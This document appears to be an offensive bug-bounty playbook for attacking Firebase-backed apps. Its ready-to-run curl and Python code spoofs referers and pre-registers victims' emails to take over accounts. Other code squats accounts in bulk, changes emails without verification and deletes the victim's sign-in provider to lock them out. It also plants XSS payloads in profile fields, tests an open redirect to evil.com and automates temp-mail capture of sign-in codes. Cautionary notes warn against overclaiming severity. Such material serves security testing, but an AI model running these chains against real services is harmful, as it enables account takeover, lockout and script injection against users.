# Firebase Authentication Bypass Patterns

## When to Use
- Target uses Firebase Auth (check `/__/firebase/init.json`, `firebaseConfig` in JS)
- App uses email-link (passwordless) as primary auth method
- Firebase API key exposed in client-side code

## Pre-Check
```bash
# Get Firebase config
curl -sk "https://<auth-domain>/__/firebase/init.json"
# Extract API key from page source
curl -sk "https://<target>/" | grep -oE "AIza[A-Za-z0-9_-]{35}"
```

## Referer Restriction Bypass

Firebase API keys restricted by HTTP Referer can be bypassed from non-browser contexts:

```bash
# If blocked ("Requests from referer <empty> are blocked"):
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" \
  -H "Content-Type: application/json" \
  -H "Referer: https://www.target.com/" \
  -d '{"email":"x@x.com","password":"pass","returnSecureToken":true}'
# Referer is trivially spoofable from curl/Python/Burp — NOT a security boundary.
```

Discover allowed referer from: JS config (`window.__CONFIG__`), source HTML, or just try the main domain.

## Critical Test: Password Provider Enabled on Passwordless Apps

Many apps use `signInWithEmailLink` but forget to disable `signInWithPassword` in Firebase console.

### Step 1: Test signUp with email+password
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@attacker.com","password":"Test123!","returnSecureToken":true}'
```
- If returns `idToken` → **password provider is enabled (VULN)**
- If returns `ADMIN_ONLY_OPERATION` → signUp disabled (check signIn separately)
- If returns `OPERATION_NOT_ALLOWED` → password provider properly disabled

### Step 2: Verify account shows as registered
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"identifier":"test@attacker.com","continueUri":"https://<target>/login"}'
```
- `"registered": true, "signinMethods": ["password"]` = confirmed

### Step 3: Pre-registration ATO chain
1. Attacker creates account with victim's email + password
2. Victim tries to sign up → Firebase sees "already registered"
3. If victim uses email-link, it links to SAME UID attacker controls
4. Attacker has persistent password access to victim's account

### Step 4: Mass account squatting (no rate limit)
```python
for i in range(N):
    firebase_request("accounts:signUp", {
        "email": f"target{i}@domain.com",
        "password": "Pwned!123",
        "returnSecureToken": True
    })
```

## Impact Severity Guide

| Scenario | Severity |
|----------|----------|
| Password signUp on passwordless-only gambling/finance app | **High** (KYC bypass, ATO) |
| Password signUp with email verification required by backend | **Medium** (pre-reg, provider confusion) |
| Password signUp on app that already supports password login | **Info** (by design) |
| Anonymous signUp enabled (no email needed) | **Medium** (free accounts, abuse) |

## Additional Firebase Checks

### End-to-End Proof Requirements (MANDATORY before claiming ATO)

**WinTicket lesson (June 2026):** Claimed Critical ATO because Firebase pre-registration + deleteProvider worked at the API level. Never proved the token grants access to victim data on the APPLICATION. The `/v1/auth/email/token` endpoint returned tokens to ANYONE (no Firebase validation). The "ATO" was Firebase API calls that never touched victim's actual account.

**Before claiming Firebase-based ATO, prove ALL of:**
1. **Find the real token exchange endpoint** — intercept real login flow or reverse APK. Don't guess.
2. **Prove it validates Firebase tokens** — send invalid tokens, confirm rejection. If endpoint returns tokens without any input, it's NOT the auth flow.
3. **Access victim data** — call profile/balance/history endpoint with the session. Show real data.
4. **Full chain in one script** — pre-register → password login → token exchange → victim data access.

**Severity based on what's ACTUALLY proved:**
| Proved | Severity |
|--------|----------|
| signUp works (password provider on) | Info |
| + deleteProvider locks victim out | Medium (DoS) |
| + real app session obtained | High (auth bypass) |
| + victim data accessed | Critical (ATO) |

**Trap:** Endpoints like `/v1/auth/email/token` may be CSRF/tracking tokens, NOT session tokens. Test: does it return tokens with NO auth input? If yes → not the real auth.

## Additional Firebase Checks

### Anonymous auth
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```

### Verify email (escalate from unverified → verified)
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"VERIFY_EMAIL","idToken":"<TOKEN>"}'
```

### Password reset for any user (check if enumerable)
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"PASSWORD_RESET","email":"victim@email.com"}'
```

### continueUrl open redirect
```bash
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"EMAIL_SIGNIN","email":"x@x.com","continueUrl":"https://evil.com","canHandleCodeInApp":true}'
# UNAUTHORIZED_DOMAIN = properly restricted
# Success = open redirect in email link
```

### Password change WITHOUT old password (ATO escalation)
```bash
# Step 1: Sign in with attacker's pre-registered credentials
SIGNIN=$(curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPw!","returnSecureToken":true}')
FRESH_TOKEN=$(echo "$SIGNIN" | jq -r '.idToken')

# Step 2: Change password - NO old password required, just fresh idToken
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"idToken\":\"$FRESH_TOKEN\",\"password\":\"NewPassword!\",\"returnSecureToken\":true}"
# Returns new idToken = password changed successfully
```
- CREDENTIAL_TOO_OLD_LOGIN_AGAIN = token expired, need fresh signIn first
- Combined with pre-registration: attacker squats email → changes pw → owns account permanently
- Firebase by design: `accounts:update` with fresh token = no re-auth needed

### Email Change Without Verification (HIGH)
```bash
# accounts:update allows changing email WITHOUT sending verification!
# Step 1: Create attacker account
SIGNUP=$(curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"AtkPass!","returnSecureToken":true}')
TOKEN=$(echo "$SIGNUP" | jq -r '.idToken')

# Step 2: Change email to ANY address (no verification sent to new email)
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"idToken\":\"$TOKEN\",\"email\":\"victim@target.com\",\"returnSecureToken\":true}"
# Returns: email changed, emailVerified: false
# NOTE: Firebase blocks if target email is ALREADY registered (EMAIL_EXISTS)
# Attack window: register victim emails BEFORE they sign up
```

### Delete/Unlink Provider (Victim Lockout — CRITICAL)
```bash
# After pre-registering with password, attacker can REMOVE emailLink provider
# This permanently locks the victim out of their own account!
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","deleteProvider":["emailLink"]}'
# Returns: providerUserInfo shows only ["password"] remaining
# Victim can NO LONGER use email-link sign-in (the app's only supported method)
# Verify with createAuthUri: signinMethods will show only ["password"]
```

### Full ATO Chain (Pre-Registration + Provider Unlinking)
```
Attack Flow:
1. Attacker calls signUp with victim@email.com + attacker password → gets UID
2. Victim later signs up on app via email-link → Firebase LINKS to SAME UID
3. Attacker calls signInWithPassword → valid token (same UID as victim)
4. Attacker exchanges Firebase token with app backend → valid app session
5. Attacker calls accounts:update with deleteProvider:["emailLink"]
6. Only "password" provider remains → victim permanently locked out
7. Attacker has persistent exclusive access to victim's account

Key insight: Firebase shares UIDs across providers for the same email.
The app backend maps UID→user, so attacker's session = victim's session.
```

### Re-add Password Provider (Persistence After Victim Recovery)
```bash
# Even if victim somehow recovers, attacker can re-add password
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","password":"NewPassword123!"}'
```

## Completing Email-Link Auth via Temp Email Services

When backend requires `emailLink` provider (not just `password`), intercept the OOB code:

```bash
# 1. Generate disposable email (tempmail.lol works well with Firebase)
NEW=$(curl -sk "https://api.tempmail.lol/generate")
EMAIL=$(echo "$NEW" | python3 -c "import sys,json;print(json.load(sys.stdin)['address'])")
TOKEN=$(echo "$NEW" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Trigger EMAIL_SIGNIN via Firebase API (or use the target's registration form)
curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$KEY" \
  -H "Content-Type: application/json" -H "Referer: https://<target>/" \
  -d "{\"requestType\":\"EMAIL_SIGNIN\",\"email\":\"$EMAIL\",\"continueUrl\":\"https://<target>/auth/action\"}"

# 3. Wait ~20-30s and retrieve OOB code from inbox
sleep 25
INBOX=$(curl -sk "https://api.tempmail.lol/auth/$TOKEN")
OOB=$(echo "$INBOX" | python3 -c "
import sys,json,re
for e in json.load(sys.stdin).get('email',[]):
    html=e.get('html','') or e.get('body','')
    codes=re.findall(r'oobCode=([^\s\"<>&]+)',html)
    if codes: print(codes[0].replace('&amp;','&'))
")

# 4. Sign in with email link (creates emailLink provider user)
curl -sk -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=$KEY" \
  -H "Content-Type: application/json" -H "Referer: https://<target>/" \
  -d "{\"email\":\"$EMAIL\",\"oobCode\":\"$OOB\"}"
```

**Temp email services that work with Firebase (tested June 2026):**
- `api.mail.tm` — BEST: create account (POST /accounts), poll inbox (GET /messages), full HTML body with oobCode extractable. Persistent mailbox (doesn't expire in 10min). Requires password auth (Bearer token from POST /token).
- `api.tempmail.lol` — generate + auth/$token polling (tokens expire ~10min)
- `api.guerrillamail.com` — sid_token based (Firebase delivery unreliable)
- `www.1secmail.com` — login/domain based (sometimes blocked)

### Complete Programmatic Email-Link Flow (mail.tm — PROVEN June 2026)

```python
import requests, time, re

API_KEY = "<firebase_api_key>"
TARGET = "https://www.target.com"
MAILTM = "https://api.mail.tm"

# 1. Create disposable email
domains = requests.get(f"{MAILTM}/domains").json()["hydra:member"]
domain = domains[0]["domain"]
email = f"test-{int(time.time())}@{domain}"
pwd = "TestPass123!"
r = requests.post(f"{MAILTM}/accounts", json={"address": email, "password": pwd})
# Get auth token for mailbox access
token_r = requests.post(f"{MAILTM}/token", json={"address": email, "password": pwd})
mail_token = token_r.json()["token"]
headers_mail = {"Authorization": f"Bearer {mail_token}"}

# 2. Trigger email-link sign-in (use target's own endpoint if available)
# Option A: via Firebase directly
requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={API_KEY}",
    headers={"Referer": f"{TARGET}/"},
    json={"requestType": "EMAIL_SIGNIN", "email": email,
          "continueUrl": f"{TARGET}/email/callback", "canHandleCodeInApp": True}
)
# Option B: via target's own send endpoint (often no rate limit)
# requests.post(f"{TARGET}/v1/auth/email", json={"email": email}, headers={"Bearer": pre_token})

# 3. Poll inbox for OOB code (mail.tm delivers in 5-15s)
oob_code = None
for _ in range(12):
    time.sleep(5)
    msgs = requests.get(f"{MAILTM}/messages", headers=headers_mail).json()
    for msg in msgs.get("hydra:member", []):
        detail = requests.get(f"{MAILTM}/messages/{msg['id']}", headers=headers_mail).json()
        html = detail.get("html", [""])[0] if isinstance(detail.get("html"), list) else detail.get("html", "")
        codes = re.findall(r'oobCode=([^&"<>\s]+)', html)
        if codes:
            oob_code = codes[0]
            break
    if oob_code:
        break

# 4. Complete sign-in
r = requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key={API_KEY}",
    headers={"Referer": f"{TARGET}/"},
    json={"email": email, "oobCode": oob_code}
)
id_token = r.json()["idToken"]
# Now have valid Firebase session with emailLink provider
```

**Key insight:** The `continueUrl` in step 2 determines WHERE the app redirects after auth. Use the target's actual callback URL (often `/email/callback`, `/auth/action`, or `/login/callback` — NOT always `/login/`). Discover it from the emails themselves.

**WebView Bridge Detection (mobile-only registration):**
If console logs show `WebView Callback Initiated` with methods like `showRegisterPage`, the registration flow requires the native mobile app WebView. Desktop browser cannot complete registration. Look for:
- `{method: "showRegisterPage", payload: ...}` — native app handles registration
- `{method: "view", payload: ...}` — page tracking
- Registration redirects back to same page instead of advancing

In this case, full authenticated testing requires the APK or a way to intercept the WebView-to-native bridge calls.

### Stored XSS via Firebase Profile Fields (JWT Injection)
```bash
# Firebase allows arbitrary displayName and photoUrl via accounts:update
# These are embedded in the JWT 'name' and 'picture' claims
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","displayName":"<img src=x onerror=alert(document.cookie)>","photoUrl":"javascript:alert(1)"}'
# Returns success → XSS payload stored in Firebase user profile
# Every JWT issued for this user now carries the payload in 'name' claim
```

**Impact assessment:**
- If backend passes `name` claim to frontend without sanitization → Stored XSS
- If admin panel displays user profiles → Admin XSS
- If user list/leaderboard renders displayName → mass XSS
- `photoUrl` with `javascript:` scheme → XSS if rendered as `<a href>` or `<img src>`
- Firebase does NOT sanitize these fields — it's application's responsibility

### Internal Domain Email Squatting (Privilege Escalation Attempt)
```bash
# accounts:update allows changing email to ANY unclaimed address
# Including internal corporate domains!
curl -sk -H "Referer: https://<target>/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","email":"admin@target-company.com","returnSecureToken":true}'
# If email is not already registered → SUCCESS
# Test: @target.jp, @target-company.co.jp, @parent-company.com
```

**Exploit chain:**
1. Create account with random email
2. Change email to `admin@target.com` (internal domain, unclaimed in Firebase)
3. Sign in → JWT shows `email: admin@target.com`
4. If backend grants elevated access based on email domain → privilege escalation
5. Even if no privesc: impersonation for social engineering, support abuse

**Note:** Firebase blocks if email is already registered (EMAIL_EXISTS). Attack window is unclaimed emails only. Corporate Google Workspace emails are often NOT registered in the app's Firebase project.

## Pitfalls

- **Firebase token ≠ app session (CRITICAL).** WinTicket lesson (June 2026): Firebase pre-registration + provider unlinking worked perfectly at the Firebase API layer. But the app had its own session exchange endpoint (`POST /z/auth`) that rejected all token formats we tried. The backend likely validates `sign_in_provider` claim and only accepts emailLink/google/apple — not password. Result: 50+ body format attempts returned 400, "Critical ATO" was downgraded to ZERO submittable findings. RULE: When targeting a Firebase-backed app, you MUST prove the full chain: (1) Firebase auth → (2) app session exchange → (3) access victim endpoints. Steps 1 alone is worthless if step 2 rejects your token. Always identify and test the session exchange endpoint BEFORE writing the finding report.
- **Map the login UI before claiming auth bypass.** If you can't answer "what URL does the user visit to log in?" and "what happens after they authenticate?" — you haven't done enough recon to claim an auth finding. Firebase REST API manipulation without proving app-level access is a LEAD, not a finding.
- Firebase API key is often **referer-restricted** → always add `-H "Referer: https://<target>/"`
- `ADMIN_ONLY_OPERATION` on anonymous doesn't mean password is also blocked — test separately
- Token from password signUp has `sign_in_provider: "password"` in JWT — backend may reject if it checks provider
- Some apps accept the Firebase token for auth but require additional registration steps (204 but still 401 on protected endpoints)
- Backend may check `firebase.sign_in_provider` claim — password provider token gets 401 even with emailVerified=true. Only `emailLink` provider tokens grant full access on email-link-only apps.
- `emailVerified` cannot be set client-side via `accounts:update` — Firebase ignores the field (server-side only)
- OOB codes are single-use — if consumed via API, the browser/app flow will get INVALID_OOB_CODE
- Temp email tokens expire quickly (~10min) — poll immediately after sending the sign-in link
- Always clean up test accounts after PoC: `accounts:delete` with idToken

### CRITICAL VALIDATION GATE: "Token Exchange" ≠ "ATO" (WinTicket lesson, June 2026)

**Before claiming ATO, you MUST prove ALL of these in sequence:**

1. **Token exchange actually validates Firebase token** — send request WITHOUT any bearer / with garbage bearer. If the endpoint returns a token anyway → it's NOT a real auth endpoint. Your "exploit" is meaningless.

2. **Returned token grants authenticated access** — call a protected endpoint (`/users/me`, `/profile`, `/account`) with the token. If you get 401 → it's NOT a session token (might be CSRF, tracking, or rate-limit token).

3. **Authenticated access shows VICTIM data** — if you can only see your own empty pre-registered account, you haven't proved ATO. You need to show data that belongs to someone else (or prove the UID-sharing means your session IS the victim's session by showing shared state).

4. **For mobile-only apps** — if the app has no web login and the real auth happens via native SDK/WebView bridge, your REST API calls may be hitting a completely different auth flow than real users use. Reverse the APK/IPA to find the actual token exchange endpoint.

**The test that would have caught WinTicket:**
```bash
# Send to "auth" endpoint with NO bearer at all
curl -sk -X POST "https://api.target.com/v1/auth/email/token" \
  -H "Origin: https://www.target.com"
# If this returns a token → endpoint doesn't validate auth → NOT exploitable
```

**Severity mapping:**
| What you proved | Real severity |
|---|---|
| Firebase manipulation only (pre-reg, email change, provider unlink) | Medium (DoS/misconfiguration) |
| Firebase token accepted by backend + 401 on all endpoints | Medium (same as above) |
| Firebase token → access to YOUR OWN empty profile only | Low-Medium |
| Firebase token → access to VICTIM's data/profile/balance | High-Critical (actual ATO) |

## WinTicket Case Study (June 2026) — CAUTIONARY TALE

**What was claimed:** Full ATO chain (Critical)
**What was actually proved:** Firebase-level manipulation only (Medium — lockout DoS)

- App uses email-link only for auth
- Password signUp NOT disabled → unlimited account creation ✅
- Mass pre-registration confirmed (no rate limit) ✅
- `deleteProvider:["emailLink"]` confirmed — removes victim's only login method ✅ (DoS)
- `accounts:update` email change WITHOUT verification confirmed ✅ (Firebase-level)

**WHERE IT FELL APART:**
- `/v1/auth/email/token` returns a token **even with NO auth header** — it does NOT validate Firebase tokens
- The returned token is `timestamp.hash` (likely CSRF/tracking), NOT a session token
- Token gives 401 on `/v1/users/me` — NOT authenticated
- Real auth likely happens in native mobile app via different endpoint (never found)
- **NEVER accessed another user's data or profile — ATO was never proved**

**Honest severity:** Medium (Firebase misconfiguration → account lockout DoS + provider manipulation). NOT ATO without proving data access.

**Lesson:** Firebase API manipulation ≠ application-level compromise. You MUST prove the app's actual auth flow uses the Firebase token you control.
